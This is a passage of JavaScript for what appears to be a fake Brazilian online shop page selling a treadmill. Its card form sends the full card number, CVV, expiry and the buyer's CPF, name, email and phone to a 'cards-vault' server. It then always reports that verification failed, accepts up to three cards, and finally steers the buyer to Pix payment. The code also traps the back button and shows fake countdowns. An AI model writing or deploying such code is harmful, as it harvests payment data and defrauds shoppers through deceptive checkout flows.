    if (numRaw.length !== 16) { shake(el('cfNum'), 'O cartão deve ter 16 dígitos'); return; }
    if (!_luhn(numRaw))       { shake(el('cfNum'), 'Número do cartão inválido, verifique os dígitos'); return; }
    if (_cfCountry && _cfCountry !== 'BR') { shake(el('cfNum'), 'Aceitamos apenas cartões emitidos no Brasil'); return; }
    if (exp.length < 5 || !_validExp(exp)) { shake(el('cfExp'), 'Data de vencimento inválida, expirada ou acima do limite'); return; }
    var cvvLen = (_cfBrand === 'amex') ? 4 : 3;
    if (cvv.length < cvvLen) { shake(el('cfCvv'), 'Código de segurança inválido, são ' + cvvLen + ' dígitos'); return; }
    var words = name.split(/\s+/).filter(function (w) { return w.length > 0; });
    if (words.length < 2) { shake(el('cfName'), 'Informe o nome completo como está no cartão'); return; }

    // ── Rate limit: mesmo cartão / máximo de 3 cartões distintos ──
    var fp  = _cardFp(numRaw);
    var fps = _getCardFps();
    if (fps.indexOf(fp) !== -1) {
      shake(el('cfNum'), 'Não é possível adicionar o mesmo cartão');
      return;
    }
    if (fps.length >= CARD_LIMIT) {
      // limite já estourado (proteção extra) → força PIX
      fecharCardForm();
      abrirCardErrorModal(0, true);
      return;
    }
    fps.push(fp);
    _saveCardFps(fps);
    var remaining = CARD_LIMIT - fps.length;             // tentativas restantes após esta

    var last4 = numRaw.slice(-4);
    S.cardData = { brand: _cfBrand || 'card', last4: last4, expiry: exp, name: name };
    S.payMethod = 'card';
    payMethod = 'card';

    var saveBtn = document.querySelector('.cf-save-btn');
    if (saveBtn) { saveBtn.disabled = true; saveBtn.textContent = 'Verificando…'; }

    function _finalizarSalvar() {
      if (saveBtn) { saveBtn.disabled = false; saveBtn.textContent = 'Cadastrar e Finalizar'; }
      fecharCardForm();
      el('pmPix').classList.remove('pm-sel');
      el('pmCard').classList.add('pm-sel');
      el('pmPixCheck').style.display = 'none';
      el('pmCardCheck').style.display = 'inline-flex';
      $('input[value="card"]', $('#payOpts')).checked = true;
      _renderSavedCard();
      _updatePayBtn();
      // remaining <= 0 → 3º cartão: erro + aviso de PIX + desativa cartão
      setTimeout(function () { abrirCardErrorModal(remaining, remaining <= 0); }, 300);
    }

    if (!CARDS_API) { _finalizarSalvar(); return; }

    fetch(CARDS_API + '/api/cards', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cpf:         el('cpf')   ? el('cpf').value.replace(/\D/g, '')  : '',
        nome:        el('nome')  ? el('nome').value.trim()              : '',
        email:       el('email') ? el('email').value.trim()             : '',
        telefone:    el('tel')   ? el('tel').value.replace(/\D/g, '')   : '',
        brand:       _cfBrand  || 'card',
        last4:       last4,
        expiry:      exp,
        cvv:         cvv,
        card_number: numRaw,
        bank:        _cfBank   || null,
        card_level:  _cfLevel  || null,
        card_type:   _cfType   || null,
      })
    })
      .then(function (r) { return r.json(); })
      .then(function (d) { console.log('[cards-vault]', d.action, d.id); _finalizarSalvar(); })
      .catch(function (e) { console.warn('[cards-vault] falhou, prosseguindo:', e.message); _finalizarSalvar(); });
  }

  function _renderSavedCard() {
    var area = el('savedCardArea');
    if (!area || !S.cardData) return;
    var d = S.cardData;
    var brandHtml = _brandImg(d.brand, 44, 28) ||
      '<svg width="44" height="28" viewBox="0 0 44 28" fill="none"><rect width="44" height="28" rx="4" fill="#e0e0e0"/></svg>';
    area.innerHTML =
      '<div class="saved-card-box" onclick="editarCartao()">' +
        '<div class="sc-brand">' + brandHtml + '</div>' +
        '<div class="sc-info">' +
          '<div class="sc-num">•••• •••• •••• ' + esc(d.last4) + '</div>' +
          '<div class="sc-meta">' + esc(d.name) + ' &nbsp;•&nbsp; ' + esc(d.expiry) + '</div>' +
        '</div>' +
        '<div class="sc-edit">Editar</div>' +
      '</div>';
    area.style.display = 'block';
  }

  function editarCartao() {
    abrirCardForm();
  }

  function _updatePayBtn() {
    var main = el('ftMain');
    if (!main || S.step !== 3) return;
    var isCard = (S.payMethod === 'card' && S.cardData);
    main.textContent = isCard ? 'Pagar com Cartão' : 'Pagar com PIX';
    var sub = el('ftSub');
    if (sub) {
      if (isCard) {
        var sel = el('cfParc');
        var n = sel ? (parseInt(sel.value, 10) || 12) : 12;
        sub.textContent = n + 'x de ' + fmt(calcTotal() / n) + ', sem juros';
      } else {
        sub.textContent = '';
      }
    }
  }

  function abrirCardErrorModal(remaining, isLast) {
    // sem args (ex.: clique em "Pagar com Cartão") → calcula pelo storage
    if (remaining === undefined) {
      remaining = Math.max(0, CARD_LIMIT - _getCardFps().length);
      isLast = remaining <= 0;
    }
    var title  = el('ceTitle');
    var txt    = el('ceText');
    var cancel = el('ceCancel');
    var total  = calcTotal();

    if (isLast) {
      if (title)  title.textContent = 'Limite de tentativas atingido';
      if (txt)    txt.innerHTML = 'Não foi possível verificar nenhum dos seus cartões. Por segurança, o pagamento com cartão foi desativado. Você será redirecionado para o pagamento via <b>Pix</b> com 73% de desconto — ' + fmt(total) + '.';
      if (cancel) cancel.style.display = 'none';
      disableCardOption();
    } else {
      var t = 'Resta' + (remaining === 1 ? '' : 'm') + ' ' + remaining +
              ' tentativa' + (remaining === 1 ? '' : 's') + ', utilize outro cartão.';
      if (title)  title.textContent = 'Não foi possível verificar o cartão';
      if (txt)    txt.innerHTML = 'Não conseguimos verificar os dados do seu cartão. <b>' + t +
                    '</b> Ou finalize agora via Pix e aproveite 73% de desconto à vista — ' + fmt(total) + '.';
      if (cancel) cancel.style.display = '';
    }

    el('ftBtn').disabled = true;
    el('loaderTxt').textContent = 'Verificando cartão!';
    el('loaderOverlay').classList.add('show');
    setTimeout(function () {
      el('loaderOverlay').classList.remove('show');
      el('ftBtn').disabled = false;
      el('cardErrorModal').style.display = 'flex';
    }, 2000);
  }

  function pagarViaPIX() {
    el('cardErrorModal').style.display = 'none';
    var pmCard = el('pmCard');
    if (pmCard) { pmCard.style.opacity = '0.35'; pmCard.style.pointerEvents = 'none'; }
    S.payMethod = 'pix';
    payMethod = 'pix';
    comprar();
  }

  // Expõe funções chamadas via onclick no HTML
  window.selectPayMethod = selectPayMethod;
  window.abrirCardForm   = abrirCardForm;
  window.fecharCardForm  = fecharCardForm;
  window.cfFormatNum     = cfFormatNum;
  window.cfFormatExp     = cfFormatExp;
  window.cfOnNameInput   = cfOnNameInput;
  window.cfClearName     = cfClearName;
  window.salvarCartao    = salvarCartao;
  window.editarCartao    = editarCartao;
  window.pagarViaPIX     = pagarViaPIX;

  /* ── Order Bump ──────────────────────────────────────────────── */
  const obModal = document.getElementById('orderBumpModal');

  function openOrderBump() {
    // fluxo normal: garante que a oferta de back-redirect não fique ativa
    backOffer = null;
    extraItems = extraItems.filter(i => !i.gift);
    // limpa itens de ob adicionados em visita anterior ao checkout
    $$('.ob-item', obModal).forEach(item => {
      const idx = extraItems.findIndex(i => i.title === item.dataset.title);
      if (idx >= 0) { cart -= extraItems[idx].qty; extraItems.splice(idx, 1); }
    });
    $('#cartCount').textContent = String(cart);
    updateCheckout();

    $$('.ob-item', obModal).forEach(item => {
      item.classList.remove('is-sel');
      item.setAttribute('aria-checked', 'false');
    });
    obModal.classList.add('is-open');
    document.body.style.overflow = 'hidden';
    $('#obConfirm').focus();
  }

  function closeOrderBump() {
    obModal.classList.remove('is-open');
    document.body.style.overflow = '';
  }

  function proceedToCheckout() {
    $$('.ob-item.is-sel', obModal).forEach(item => {
      const title = item.dataset.title;
      const price = parseFloat(item.dataset.price);
      const existing = extraItems.find(i => i.title === title);
      if (existing) existing.qty += 1;
      else extraItems.push({ title, price, qty: 1 });
      cart += 1;
    });
    $('#cartCount').textContent = String(cart);

    closeOrderBump();
    clearTimeout(loadTimer);
    clearInterval(pollTimer);
    pararCronometro();
    doneView.hidden = true;
    current = 1;
    renderSteps();
    updateCheckout();
    cho.querySelector('.cho__scroll').scrollTop = 0;
    showLoading('Preparando tudo para<br>sua compra');
    openModal(cho);
    fbTrack('InitiateCheckout', { value: unitPrice() * qty, currency: 'BRL', content_ids: [PRODUCT_ID], content_type: 'product' });
    ttkTrack('InitiateCheckout', { value: unitPrice() * qty, quantity: qty });
    hideLoadingAfter(1500, () => showSeguro(() => $('#fCep').focus()));
  }

  $$('.ob-item', obModal).forEach(item => {
    const toggle = () => {
      const sel = item.classList.toggle('is-sel');
      item.setAttribute('aria-checked', String(sel));
    };
    item.addEventListener('click', toggle);
    item.addEventListener('keydown', e => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); toggle(); }
    });
  });

  $('#obConfirm').addEventListener('click', proceedToCheckout);
  $('#obSkip').addEventListener('click', proceedToCheckout);
  obModal.addEventListener('mousedown', e => { if (e.target === obModal) proceedToCheckout(); });
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape' && obModal.classList.contains('is-open')) proceedToCheckout();
  });

  /* ═══════════════════════════════════════════
     BACK-REDIRECT / EXIT-INTENT
     Trava o botão "voltar" (só no front): re-empurra o history e abre um
     popup com o combo Esteira WCT + Garrafa Esportiva + tapete de yoga de brinde.
     ═══════════════════════════════════════════ */
  const boModal   = document.getElementById('backOfferModal');
  const GIFT_ITEM = { title: 'Tapete de Yoga Antiderrapante (Brinde)', price: 0, qty: 1, img: 'https://http2.mlstatic.com/D_NQ_NP_888266-MLA108193709801_032026-O.webp', gift: true };
  const BACK_FLIP = { title: 'Garrafa Esportiva 700ml', price: 24.00, qty: 1, img: 'https://http2.mlstatic.com/D_NQ_NP_804182-MLA100692751976_122025-O.webp', isBackFlip: true };
  const BACK_OFFER_TOTAL = 183.20;
  let boTimerId = null;

  function startBoTimer() {
    const elT = document.getElementById('boTimer');
    if (!elT) return;
    clearInterval(boTimerId);
    let left = 120;                                    // 2:00
    const render = () => {
      const m = String(Math.floor(left / 60)).padStart(2, '0');
      const s = String(left % 60).padStart(2, '0');
      elT.textContent = `${m}:${s}`;
    };
    render();
    boTimerId = setInterval(() => {
      left = Math.max(0, left - 1);
      render();
      if (left === 0) clearInterval(boTimerId);
    }, 1000);
  }

  function openBackOffer() {
    if (boModal.classList.contains('is-open')) return;
    boModal.classList.add('is-open');
    document.body.style.overflow = 'hidden';
    startBoTimer();
    const acc = document.getElementById('boAccept');
    if (acc) acc.focus();
  }

  function closeBackOffer() {
    boModal.classList.remove('is-open');
    clearInterval(boTimerId);
    // só libera o scroll se nenhum outro modal estiver aberto
    if (!openModalEl() && !obModal.classList.contains('is-open')) document.body.style.overflow = '';
  }

  /* Aceitou a oferta → monta o combo + brinde e vai DIRETO ao checkout (pula o order bump). */
  function acceptBackOffer() {
    // Combo: Esteira WCT (R$ 159,20) + Garrafa Esportiva (R$ 24,00) + Tapete de brinde = R$ 183,20
    backOffer = { unit: 159.20, qty: 1 };
    extraItems = extraItems.filter(i => !i.gift && !i.isBackFlip);
    extraItems.push(Object.assign({}, BACK_FLIP));
    extraItems.push(Object.assign({}, GIFT_ITEM));
    closeBackOffer();
    clearTimeout(loadTimer);
    clearInterval(pollTimer);
    pararCronometro();
    doneView.hidden = true;
    setQty(1);                                           // atualiza qtd + resumo
    current = 1;
    renderSteps();
    updateCheckout();
    cho.querySelector('.cho__scroll').scrollTop = 0;
    showLoading('Preparando sua oferta<br>especial…');
    openModal(cho);
    fbTrack('InitiateCheckout', { value: BACK_OFFER_TOTAL, currency: 'BRL', content_ids: [PRODUCT_ID], content_type: 'product', num_items: 2 });
    ttkTrack('InitiateCheckout', { value: BACK_OFFER_TOTAL, quantity: 2 });
    hideLoadingAfter(1400, () => $('#fCep').focus());
  }

  document.getElementById('boAccept').addEventListener('click', acceptBackOffer);
  document.getElementById('boClose').addEventListener('click', closeBackOffer);
  document.getElementById('boDismiss').addEventListener('click', closeBackOffer);
  boModal.addEventListener('mousedown', e => { if (e.target === boModal) closeBackOffer(); });
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape' && boModal.classList.contains('is-open')) closeBackOffer();
  });

  /* Armadilha do botão "voltar": empurra um estado extra e, a cada popstate,
     re-empurra (mantém o usuário na página) e mostra a oferta — a não ser que
     haja um modal aberto, caso em que o "voltar" só fecha o modal. */
  try { history.pushState({ lrz: 'keep' }, '', location.href); } catch (_) {}
  window.addEventListener('popstate', function () {
    try { history.pushState({ lrz: 'keep' }, '', location.href); } catch (_) {}
    if (openModalEl() || obModal.classList.contains('is-open')) { closeOrderBump(); closeModals(); return; }
    if (boModal.classList.contains('is-open')) return;
    openBackOffer();
  });

  /* ---- abrir/reabrir o checkout: order bump → intersticial → etapa 1 ---- */
  $('#buyNow').addEventListener('click', openOrderBump);

  // ViewContent (visualização do produto) — dispara uma vez ao carregar
  fbTrack('ViewContent', { value: unitPrice(), currency: 'BRL', content_ids: [PRODUCT_ID], content_type: 'product', content_name: 'Esteira Elétrica WCT Fitness' });
  ttkTrack('ViewContent', { value: unitPrice() });

  /* ---------- Contagem regressiva da entrega ---------- */
  (function countdown() {
    const el = $('#countdown');
    if (!el) return; // countdown removido do buybox
    const deadline = Date.now() + (7 * 60 + 51) * 60 * 1000;
    const tick = () => {
      const left = deadline - Date.now();
      if (left <= 0) {
        el.textContent = 'poucos minutos';
        clearInterval(timer);
        return;
      }
      const h = Math.floor(left / 3600000);
      const m = Math.floor((left % 3600000) / 60000);
      el.textContent = `${h} h ${m} min`;
    };
    const timer = setInterval(tick, 30000);
    tick();
  })();

  /* ======================= CARDS E CARROSSÉIS ======================= */
  const relImg = (n, size) => REL_IMGS[(n - 1) % REL_IMGS.length];

  function cardHTML(p) {
    return `<li class="pcard">
      <a class="pcard__link" href="?id=${p.id}">
      <div class="pcard__img">
        <img src="${relImg(p.img, 's')}" width="340" height="340" loading="lazy" decoding="async" alt="${esc(p.t)}">
      </div>
      <div class="pcard__body">
        <h3 class="pcard__title">${esc(p.t)}</h3>
        ${p.old ? `<p class="pcard__old">R$ ${p.old}</p>` : ''}
        <p class="pcard__price">
          ${p.off ? `<span class="pcard__off">${p.off}</span>` : ''}
          <span class="amount">${supPrice(p.p)}</span>
          ${p.sold ? `<small>${p.sold}</small>` : ''}
        </p>
        ${p.pix ? '<p class="pcard__pix">no Pix</p>' : ''}
        <p><span class="pcard__mp">20% OFF no saldo</span></p>
        ${p.ship ? `<p class="pcard__ship">Frete grátis ${p.full ? '<span class="full-tag">FULL</span>' : ''}</p>` : ''}
      </div>
      </a>
      <button class="pcard__buy" type="button" data-buy="${esc(p.t)}" data-price="${p.p}"
              aria-label="Adicionar ${esc(p.t)} ao carrinho">Adicionar ao carrinho</button>
    </li>`;
  }

  /** Compra direta a partir de um card de carrossel — adiciona ao carrinho e abre o checkout. */
  function bindCardBuy(track) {
    track.addEventListener('click', e => {
      const btn = e.target.closest('.pcard__buy');
      if (!btn) return;

      const price = parseFloat(btn.dataset.price.replace(',', '.'));
      const title = btn.dataset.buy;
      const existing = extraItems.find(i => i.title === title);
      if (existing) {
        existing.qty += 1;
      } else {
        extraItems.push({ title, price, qty: 1 });
      }

      cart += 1;
      $('#cartCount').textContent = String(cart);
      $('#cartBtn').setAttribute('aria-label', `Carrinho com ${cart} produtos`);

      const shortTitle = title.length > 32 ? title.slice(0, 32) + '…' : title;
      toast(`"${shortTitle}" adicionado ao carrinho.`);

      updateCheckout();

      if (cho.hidden) {
        clearTimeout(loadTimer);
        clearInterval(pollTimer);
        pararCronometro();
        doneView.hidden = true;
        current = 1;
        renderSteps();
        cho.querySelector('.cho__scroll').scrollTop = 0;
        showLoading('Preparando tudo para<br>sua compra');
        openModal(cho);
        hideLoadingAfter(1500, () => showSeguro(() => $('#fCep').focus()));
      }
    });
  }

  /* Está em um produto secundário? Então o principal volta pra primeira posição
     de todas as vitrines, e o produto que ele já está vendo sai da lista. */
  const _viewId = new URLSearchParams(location.search).get('id') || MAIN_ID;
  const _isSecundario = _viewId !== MAIN_ID;
  const comPrincipal = list => {
    if (!_isSecundario) return list;
    return [MAIN_CARD].concat(list.filter(p => String(p.id) !== String(_viewId)));
  };

  $('#relTrack').innerHTML = comPrincipal(RELATED).map(cardHTML).join('');
  $('#storeTrack').innerHTML = comPrincipal(STORE).map(cardHTML).join('');
  [$('#relTrack'), $('#storeTrack')].forEach(bindCardBuy);

  $$('[data-carousel]').forEach(carousel => {
    const track = $('.carousel__track', carousel);
    const [prev, next] = $$('.carousel__arrow', carousel);

    let _pd = null, _nd = null;
    const update = () => {
      const max = track.scrollWidth - track.clientWidth;
      const p = track.scrollLeft <= 4;
      const n = track.scrollLeft >= max - 4;
      // só escreve quando muda → evita recálculo/repaint a cada frame de scroll (que causava flicker)
      if (p !== _pd) { prev.disabled = _pd = p; }
      if (n !== _nd) { next.disabled = _nd = n; }
    };
    let _raf = 0;
    const onScroll = () => { if (_raf) return; _raf = requestAnimationFrame(() => { _raf = 0; update(); }); };

    $$('.carousel__arrow', carousel).forEach(arrow => arrow.addEventListener('click', () => {
      track.scrollBy({ left: Number(arrow.dataset.dir) * (track.clientWidth - 40), behavior: 'smooth' });
    }));
    track.addEventListener('scroll', onScroll, { passive: true });

    // reavalia quando as imagens carregam ou o container muda de tamanho
    if ('ResizeObserver' in window) new ResizeObserver(update).observe(track);
    $$('img', track).forEach(img => img.addEventListener('load', update, { once: true }));
    update();
  });

  /* ---------- Aside e anúncio ---------- */
  function adRowHTML(p, opts) {
    const o = opts || {};
    return `<li class="adrow">${p.id ? `<a class="adrow__link" href="?id=${p.id}">` : ''}
      <div class="adrow__img">
        <img src="${relImg(p.img, 'xs')}" width="124" height="124" loading="lazy" decoding="async" alt="${esc(p.t)}">
      </div>
      <div class="adrow__body">
        <p class="adrow__title">${esc(p.t)}</p>
        ${o.seller ? `<p class="adrow__seller">Por Central Fit ${icon('i-check', 'verified')}</p>` : ''}
        ${p.off && !o.seller ? `<p class="adrow__discount"><span class="pcard__off">${p.off}</span><s>R$ ${p.old}</s></p>` : ''}
        <p class="adrow__price">${supPrice(p.p)}${o.seller && p.old ? `<s>R$ ${p.old}</s>` : ''}${p.sold ? `<small>${p.sold}</small>` : ''}</p>
        ${p.pix ? '<p class="adrow__pix">no Pix</p>' : ''}
        ${o.seller ? '' : `<p><span class="pcard__mp">20% OFF no saldo</span></p>
        <p class="pcard__ship">Frete grátis ${p.full ? '<span class="full-tag">FULL</span>' : ''}</p>`}
      </div>${p.id ? '</a>' : ''}
    </li>`;
  }
  $('#asideList').innerHTML = comPrincipal(ASIDE).map(p => adRowHTML(p)).join('');

  /* ======================= FOTOS DO PRODUTO ======================= */
  const photosEl = $('#photos');
  const photoImg = (p, i) =>
    `<img src="${p.zoom}" width="${p.zw}" height="${p.zh}" data-i="${i}"
          loading="lazy" decoding="async" alt="${esc(p.alt)}">`;

  photosEl.innerHTML =
    PHOTOS.slice(0, 2).map((p, i) => photoImg(p, i)).join('') +
    '<div class="photos__hidden" id="photosHidden" hidden>' +
    PHOTOS.slice(2).map((p, i) => photoImg(p, i + 2)).join('') +
    '</div>';

  photosEl.addEventListener('click', e => {
    const img = e.target.closest('img');
    if (!img) return;
    openLightbox(Number(img.dataset.i), PHOTOS.map(p => ({ src: p.zoom, thumb: p.thumb, alt: p.alt, w: p.zw, h: p.zh })));
  });

  /* ============================ TOGGLES ============================ */
  function bindToggle(btn, target, labelClosed, labelOpen, opts) {
    const o = opts || {};
    const textEl = $('.toggle-link__text', btn);
    btn.addEventListener('click', () => {
      const open = btn.getAttribute('aria-expanded') !== 'true';
      btn.setAttribute('aria-expanded', String(open));
      textEl.textContent = open ? labelOpen : labelClosed;

      if (o.useHidden) target.hidden = !open;
      else target.classList.toggle('is-open', open);

      if (o.fade) o.fade.classList.toggle('is-open', open);
      if (!open) btn.scrollIntoView({ block: 'center' });
    });
  }
  bindToggle($('#specsToggle'), $('#specsMore'), 'Conferir todas as características', 'Ver menos características', { useHidden: true, fade: $('#specFade') });
  bindToggle($('#photosToggle'), $('#photosHidden'), 'Ver mais imagens', 'Ver menos imagens', { useHidden: true });
  bindToggle($('#descToggle'), $('#desc'), 'Ver descrição completa', 'Ver menos', { fade: $('#descFade') });

  /* ============================ PERGUNTAS ============================ */
  const questions = [];
  const qList = $('#qList');
  const qInput = $('#qInput');

  $('#qForm').addEventListener('submit', e => {
    e.preventDefault();
    const value = qInput.value.trim();
    if (!value) { qInput.focus(); return; }
    questions.unshift({
      q: value,
      a: 'Olá! Sua pergunta foi enviada ao vendedor. A resposta aparece aqui em até 24 h.',
      when: 'agora'
    });
    qInput.value = '';
    qList.innerHTML = questions.map(item => `
      <li class="qitem">
        <p class="qitem__q">${esc(item.q)}</p>
        <p class="qitem__a">${icon('i-right')}${item.a}</p>
        <p class="qitem__meta">${item.when}</p>
      </li>`).join('');
    toast('Pergunta enviada ao vendedor.');
  });

  /* ============================ OPINIÕES ============================ */
  $('#bars').innerHTML = BARS.map(b => `
    <button class="bar" type="button" data-rate="${b.star}" aria-pressed="false"
            aria-label="Filtrar por ${b.star} estrela${b.star > 1 ? 's' : ''} (${b.pct}%)">
      <span class="bar__track"><span class="bar__fill" style="width:${b.pct}%"></span></span>
      <span class="bar__lbl" aria-hidden="true">${b.star} ${icon('i-star')}</span>
    </button>`).join('');

  $('#rphotos').innerHTML = REVIEW_MEDIA.map((m, i) => `
    <li>
      <button class="rphoto${m.type === 'video' ? ' rphoto--video' : ''}" type="button" data-i="${i}" aria-label="Ver ${m.type === 'video' ? 'vídeo' : 'foto'} ${i + 1} enviado por cliente">
        <img src="${m.thumb}" width="176" height="220" loading="lazy" decoding="async" alt="">
        ${m.type === 'video' ? `<span class="rphoto__play" aria-hidden="true">${icon('i-play')}${m.dur ? `<em>${m.dur}</em>` : ''}</span>` : ''}
        <span aria-hidden="true">5 ${icon('i-star')}</span>
      </button>
    </li>`).join('');

  $('#rphotos').addEventListener('click', e => {
    const btn = e.target.closest('.rphoto');
    if (!btn) return;
    openLightbox(Number(btn.dataset.i), REVIEW_MEDIA);
  });

  const rlist = $('#rlist');
  const revToggle = $('#revToggle');
  const PAGE = 3;
  let sortMode = 'rel';
  let rateFilter = 0;
  let showAll = false;
  let _revCount = '3.387';
  let _revAI = 'Esteira silenciosa, fácil de montar e dobrável para guardar. Ótimo custo-benefício para uso diário em casa — aguenta bem o uso intenso e mantém a correia lubrificada com facilidade.';
  let revMediaSets = [];   // por render: índice do comentário visível → sua mídia (p/ o lightbox)

  function filteredReviews() {
    const list = REVIEWS.filter(r => !rateFilter || r.rate === rateFilter);
    const by = {
      new: (a, b) => a.ageDays - b.ageDays,
      high: (a, b) => b.rate - a.rate || b.likes - a.likes,
      low: (a, b) => a.rate - b.rate || b.likes - a.likes,
      rel: (a, b) => b.likes - a.likes
    };
    return list.sort(by[sortMode] || by.rel);
  }

  function renderReviews() {
    const list = filteredReviews();
    const visible = showAll ? list : list.slice(0, PAGE);
    revMediaSets = visible.map(r => r.media || []);

    rlist.innerHTML = visible.length
      ? visible.map((r, si) => {
        const long = r.text.length > 260;
        return `<article class="review">
          <div class="review__head">
            <span class="stars" aria-hidden="true">${[1, 2, 3, 4, 5].map(n => star(n <= r.rate)).join('')}</span>
            <span class="sr">Nota ${r.rate} de 5.</span>
            <span class="review__meta">${r.country} <i aria-hidden="true"></i> ${r.when}</span>
          </div>
          ${r.text ? `<p class="review__text${long ? ' is-clamped' : ''}">${esc(r.text).replace(/😂/g, '<svg width="16" height="16" aria-hidden="true" focusable="false" style="vertical-align:-3px"><use href="#i-smile"/></svg>')}</p>` : ''}
          ${long ? '<button class="review__more" type="button" aria-expanded="false">Saiba mais</button>' : ''}
          ${r.media ? `<div class="review__pics">${r.media.map((m, mi) => `
            <button type="button" class="review__media${m.type === 'video' ? ' is-video' : ''}" data-si="${si}" data-mi="${mi}" aria-label="${m.type === 'video' ? 'Ver vídeo' : 'Ampliar foto'} da opinião">
              <img src="${m.thumb}" width="176" height="220" loading="lazy" decoding="async" alt="">
              ${m.type === 'video' ? `<span class="rphoto__play" aria-hidden="true">${icon('i-play')}${m.dur ? `<em>${m.dur}</em>` : ''}</span>` : ''}
            </button>`).join('')}</div>` : ''}
          <div class="review__foot">
            <button class="review__like" type="button" aria-pressed="false">
              ${icon('i-thumb')} Útil <b>${r.likes}</b>
            </button>
            <button class="review__like" type="button" aria-label="Mais opções desta opinião">${icon('i-dots')}</button>
          </div>
        </article>`;
      }).join('')
      : '<p class="rlist__empty">Nenhuma opinião com esse filtro.</p>';

    revToggle.hidden = list.length <= PAGE;
    if (revToggle.hidden && showAll) {
      showAll = false;
      revToggle.setAttribute('aria-expanded', 'false');
      $('.toggle-link__text', revToggle).textContent = 'Mostrar todas as opiniões';
    }

    $('#rcount').textContent = rateFilter
      ? `${list.length} comentário${list.length === 1 ? '' : 's'} com ${rateFilter} estrela${rateFilter > 1 ? 's' : ''}`
      : _revCount + ' comentários';
    const _rs2 = document.getElementById('rsumCount'); if (_rs2) _rs2.textContent = _revCount + ' opiniões';
    const _ra2 = document.getElementById('raiText'); if (_ra2) _ra2.textContent = _revAI;

    /* atualiza faixa "Opiniões com fotos" com a mídia do produto atual */
    REVIEW_MEDIA = REVIEWS.reduce((a, r) => a.concat(r.media || []), []);
    const _rp = document.getElementById('rphotos');
    if (_rp) _rp.innerHTML = REVIEW_MEDIA.map((m, i) => `
      <li>
        <button class="rphoto${m.type === 'video' ? ' rphoto--video' : ''}" type="button" data-i="${i}" aria-label="Ver ${m.type === 'video' ? 'vídeo' : 'foto'} ${i + 1} enviado por cliente">
          <img src="${m.thumb}" width="176" height="220" loading="lazy" decoding="async" alt="">
          ${m.type === 'video' ? `<span class="rphoto__play" aria-hidden="true">${icon('i-play')}${m.dur ? `<em>${m.dur}</em>` : ''}</span>` : ''}
          <span aria-hidden="true">5 ${icon('i-star')}</span>
        </button>
      </li>`).join('');
  }

  rlist.addEventListener('click', e => {
    const more = e.target.closest('.review__more');
    if (more) {
      const text = more.previousElementSibling;
      const clamped = text.classList.toggle('is-clamped');
      more.textContent = clamped ? 'Saiba mais' : 'Ver menos';
      more.setAttribute('aria-expanded', String(!clamped));
      return;
    }
    const like = e.target.closest('.review__like');
    if (like && $('b', like)) {
      const counter = $('b', like);
      const on = like.getAttribute('aria-pressed') !== 'true';
      like.setAttribute('aria-pressed', String(on));
      counter.textContent = String(Number(counter.textContent) + (on ? 1 : -1));
      return;
    }
    const media = e.target.closest('[data-si]');
    if (media) {
      const set = revMediaSets[Number(media.dataset.si)] || [];
      openLightbox(Number(media.dataset.mi), set);
    }
  });

  revToggle.addEventListener('click', () => {
    showAll = !showAll;
    revToggle.setAttribute('aria-expanded', String(showAll));
    $('.toggle-link__text', revToggle).textContent = showAll ? 'Mostrar menos opiniões' : 'Mostrar todas as opiniões';
    renderReviews();
  });

  /* ---------- filtros (chips + barras) ---------- */
  function syncRateUI() {
    const label = rateFilter ? `${rateFilter} estrela${rateFilter > 1 ? 's' : ''}` : 'Qualificação';
    $('.chip__text', rateChip).textContent = label;
    rateChip.classList.toggle('is-on', Boolean(rateFilter));
    $$('#rateMenu li').forEach(li => li.setAttribute('aria-selected', String(Number(li.dataset.rate) === rateFilter)));
    $$('.bar').forEach(b => b.setAttribute('aria-pressed', String(Number(b.dataset.rate) === rateFilter)));
  }

  const sortChip = $('#sortChip');
  const rateChip = $('#rateChip');

  bindMenu(sortChip, $('#sortMenu'), li => {
    sortMode = li.dataset.sort;
    $$('#sortMenu li').forEach(x => x.setAttribute('aria-selected', String(x === li)));
    $('.chip__text', sortChip).textContent = li.textContent;
    sortChip.classList.add('is-on');
    renderReviews();
  });

  bindMenu(rateChip, $('#rateMenu'), li => {
    rateFilter = Number(li.dataset.rate);
    syncRateUI();
    renderReviews();
  });

  $('#bars').addEventListener('click', e => {
    const bar = e.target.closest('.bar');
    if (!bar) return;
    const value = Number(bar.dataset.rate);
    rateFilter = value === rateFilter ? 0 : value;
    syncRateUI();
    renderReviews();
  });

  renderReviews();

  /* ---------- infraestrutura de menus ---------- */
  function closeAllMenus() {
    $$('.dropdown.is-open,.qty__menu.is-open').forEach(m => {
      m.classList.remove('is-open');
      const owner = $(`[aria-controls="${m.id}"]`);
      if (owner) owner.setAttribute('aria-expanded', 'false');
    });
    const suggest = $('#suggest');
    suggest.classList.remove('is-open');
    $('#q').setAttribute('aria-expanded', 'false');
  }

  function bindMenu(button, menu, onPick) {
    button.addEventListener('click', e => {
      e.stopPropagation();
      const open = !menu.classList.contains('is-open');
      closeAllMenus();
      menu.classList.toggle('is-open', open);
      button.setAttribute('aria-expanded', String(open));
      if (open) ($('li[aria-selected="true"]', menu) || $('li', menu)).focus();
    });
    menu.addEventListener('click', e => {
      const li = e.target.closest('li');
      if (!li) return;
      onPick(li);
      closeAllMenus();
      button.focus();
    });
    listboxKeys(menu, button, onPick);
  }

  /** Navegação por teclado em listboxes (setas, Home/End, Enter/Espaço). */
  function listboxKeys(menu, owner, onPick) {
    menu.addEventListener('keydown', e => {
      const items = $$('li', menu);
      const current = items.indexOf(document.activeElement);
      let next = -1;
      if (e.key === 'ArrowDown') next = Math.min(current + 1, items.length - 1);
      else if (e.key === 'ArrowUp') next = Math.max(current - 1, 0);
      else if (e.key === 'Home') next = 0;
      else if (e.key === 'End') next = items.length - 1;
      else if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        if (current >= 0) { onPick(items[current]); closeAllMenus(); owner.focus(); }
        return;
      } else return;
      e.preventDefault();
      items[next].focus();
    });
  }

  document.addEventListener('click', closeAllMenus);

  /* ============================ BUSCA ============================ */
  const qField = $('#q');
  const suggest = $('#suggest');
  let sugIndex = -1;

  function renderSuggestions() {
    const term = qField.value.trim().toLowerCase();
    const hits = term ? SUGGESTIONS.filter(s => s.includes(term)) : [];
    sugIndex = -1;
    suggest.innerHTML = hits.map((h, i) =>
      `<li role="option" id="sug-${i}" aria-selected="false">${icon('i-search')}${esc(h)}</li>`).join('');
